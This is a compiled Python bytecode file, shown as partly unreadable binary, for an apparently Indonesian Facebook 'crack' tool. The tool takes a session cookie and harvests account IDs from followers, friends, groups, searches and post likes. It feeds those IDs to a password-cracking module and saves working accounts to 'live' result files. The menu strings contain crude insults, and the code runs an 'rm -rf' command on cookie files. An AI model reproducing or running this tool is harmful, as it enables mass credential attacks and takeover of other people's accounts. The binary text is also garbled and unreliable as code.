a
    �*�`�#  �                   @   s^   d dl T d dlmZ ddlmZ ddlmZ ddlm	Z
 ddlmZ dad	aG d
d� d�ZdS )�    )�*)�login�   )�shielded)�crack)�
gadag_user)�reportzhttps://mbasic.facebook.com�lo lebih ngentodc                   @   s,   e Zd Zdd� Zdd� Zdd� Zdd� Zd	S )
�awokawokawokc                 C   s<   | � �  td��� | _t�| j�| _| jd | _| ��  d S )N�cookies/info.txt�cookies)	�
cek_folder�open�readZsemuaZjson�loads�jonsonr   �	main_menu)�self� r   �/sdcard/__init__.py�__init__   s
    zawokawokawok.__init__c                 C   s�   t j�d�du rt �d� t j�d�du r4t �d� t j�d�du rNtdd� t j�d�du rhtdd� t j�d�du r�t �d� td	�}|d
v r�td� td�}q�tt	d|i� d S )N�resultFr   zresult/live.txt�azresult/chek.txtr   �clearz

 ? masukkan cookie : �� � � ! jangan kosong ngentodz ? masukkan cookie : �cookie)
�os�path�exists�mkdirr   �system�input�printr   �url)r   r   r   r   r   r      s    

zawokawokawok.cek_folderc                 C   s�   zt jt� d�| jd�}W n ty4   td� Y n0 d|jvrxzt�d� t�d� W n   t�	d� Y n0 td� d	|jv r�t�
d
d�ntat�	d� d S )Nz/profile.php�r   � ! kesalahan pada koneksiZmbasic_logout_buttonr   �cookies/token.txt�3rm -rf cookies/info.txt && rm -rf cookies/token.txtz$ ! cookie expired, harap login ulangzfree.facebookZmbasicZfreer   )�req�getr&   r   �koneksi_error�exit�textr   �remover#   �replace)r   �responr   r   r   �cek_cookies%   s    
zawokawokawok.cek_cookiesc           	      C   sL  | � �  tt| j�}td� td| jd � �� td| jd � �� t| jd d urfd| jd � d�nd	� td
� td� td� td� td� td� td� td� td� td� td� td�}|dv r�td� td�}q�|dv �r�td�}|dv �rtd� td�}q�|�� �r.t� d|� d�nt� d|� d�}ztj	|| jd�j
}W n t�yp   td� Y n0 d |v �s�d!|v �r�t|�� �r�d"|� d#�n
d$|� d#�| j� d%|v �r�td&| j� n$td't|d(��d)�j
 � |�|�a�n |d*v �rXztj	t� d+�| jd�j
}W n t�y2   td� Y n0 d,|v �rJtd-| j� |�|�a�n�|d.v �r<td/�}|dv �r�td� td/�}�qjt� d0|� �}ztj	|| jd�j
}W n t�y�   td� Y n0 d |v �s�d!|v �r�td1|� d2�| j� d%|v �r
td&| j� n.td't|d(��d)�j
d3d �  � |�||�a�n�|d4v �rtd5�}|dv �rltd� td5�}�qNt� d6|� �}ztj	|| jd�j
}W n t�y�   td� Y n0 d7|v �r�td8|� d#�| j� nHtd9�}|�� d:u �rt|dv �r�dnd;� td9�}�q�|�|t|��a�n�|d<v �r<td�}|dv �rJtd� td�}�q,|�� �rdt� d|� d=�nt� d|� d>�}ztj	|| jd�j
}W n t�y�   td� Y n0 d,|v �r�td?| j� d%|v �r�td&| j� d!|v �s�d@|v �rt|�� �r d"|� d#�n
d$|� d#�| j� n$td't|d(��d)�j
 � |�|�a�n�|dAv �r�ztj	t� dB�| jd�j
}W n t�y~   td� Y n0 dC|v �r�tdD| j� |�|�a�nl|dEv �rbtdF�}|dv �r�td� tdF�}�q�|�� �r�t� d|� �}nNzt�dG|��dH�}W n t�y    tdI� Y n0 t|�dJ|� dK��dH  }ztj	|| jd�j
}W n t�yn   td� Y n0 dL|v �r�tdM| j� z�t�dN|��dH��dOdP�}tj	t� dQ|� �| jd�j
}dR|v �s�dS|v�r�tdT| j� td9�}|�� d:u �rt|dv �rdnd;� td9�}�q�|�|t|��aW n6 t�yD   tdU� Y n t�y^   td� Y n0 n�|dVv �r~tt| j| j� n�|dWv �r�zt �!dX� t �!dY� W n   t �"dZ� Y n0 tt j#�$dX��r�d[nd\� n<|t%d]�v �r�t&t| j� n |d^v �rtd_� ntd`| j� tdak�r@t't�dbk�r6t(�)tt� ntdc� ntdU� d S )dNu�             [36m╔╦╗┬─┐┌─┐┌─┐   ╔═╗┌┐ 
           ║║├┬┘├─┤│ ┬───╠╣ ├┴┐
          ═╩╝┴└─┴ ┴└─┘   ╚  └─┘
     Created By Muhamad Badru Wasih For Public[0m
z
 * uid  : Zuidz
 * nama : ZnamaZusernamez * username : �
r   z 1. crack dari followersz 2. crack dari daftar temanz 3. crack dari member groupz 4. crack dari pencarian namaz" 5. crack dari daftar teman targetz$ 6. crack dari permintaan pertemananz 7. crack dari like postinganz 8. profile guardz 9. hapus cookiez r. report bugz 0. keluar
z ? pilih : r   r   )�1Z01z ? username/id : z/profile.php?id=z&v=followers�/z?v=followersr'   r(   zHalaman Tidak DitemukanzKonten Tidak Ditemukanz ! pengguna dengan id z tidak ditemukanz ! pengguna dengan username z/Anda Tidak Dapat Menggunakan Fitur Ini Sekarangz- ! limit bro, silahkan tunggu atau ganti akunz * target name : zhtml.parser�title)�2Z02z/me/friendsz!Tidak Ada Teman Untuk Ditampilkanz ! tidak ada teman)�3Z03z ? id grup : z/browse/group/members/?id=z ! group dengan id z% tidak ditemukan atau lo belum gabung�   )�4Z04z ? query : z/search/people/?q=zMaaf, kami tidak menemukanz ! orang dengan nama z ? jumlah : Fz ! harus berupa angka)�5Z05z
&v=friendsz/friendsz0 ! sepertinya daftar teman tidak di publikasikanz(Halaman yang Anda minta tidak ditemukan.)�6Z06z-/friends/center/requests/#friends_center_mainzTidak Ada Permintaanz" ! tidak ada permintaan pertemanan)�7Z07z ? url/id postingan : zhttps://(.*?)\.facebook\.com/r   z& ! masukkan url postingan dengan benarzhttps://z.facebook.comz5Halaman yang diminta tidak bisa ditampilkan sekarang.z ! postingan tidak ditemukanz5\<a\ href\="\/ufi\/reaction\/profile\/browser\/(.*?)"�;�&z/ufi/reaction/profile/browser/zSemua 0zOrang yang menanggapiz& ! tidak ada yang menanggapi postinganz ! error tidak diketahui)�8Z08)�9Z09r   r)   r*   z7 ! gagal menghapus cookie, silahkan hapus secara manualz * sukses menghapus cookieZrR)�0Z00z; * thanks for using my tools, jangan lupa mampir lagi tod:vz ! pilihan tidak adar	   r   z) ! gagal mengambil id, silahkan coba lagi)*r3   �asur&   r   r%   r   r$   �isdigitr+   r,   r/   r-   r.   Zkembalir   �parser�findZ	followers�	longentodZflZgrupZcari�intZrequest�re�search�group�AttributeError�splitr1   Z	like_post�guardr   r0   r#   r    r!   �tuple�laporkan�len�crackingr   )	r   ZtakeuserZpilih�userZusekr2   ZjumlahZasyuZufir   r   r   r   0   s   (



**





"




*

,











zawokawokawok.main_menuN)�__name__�
__module__�__qualname__r   r   r3   r   r   r   r   r   r
      s   r
   N)ZmodulZ
wibu.loginr   Zpepekr   rO   Zngewer   rS   r   rD   Z
report_bugr   rQ   r&   rH   r
   r   r   r   r   �<module>   s   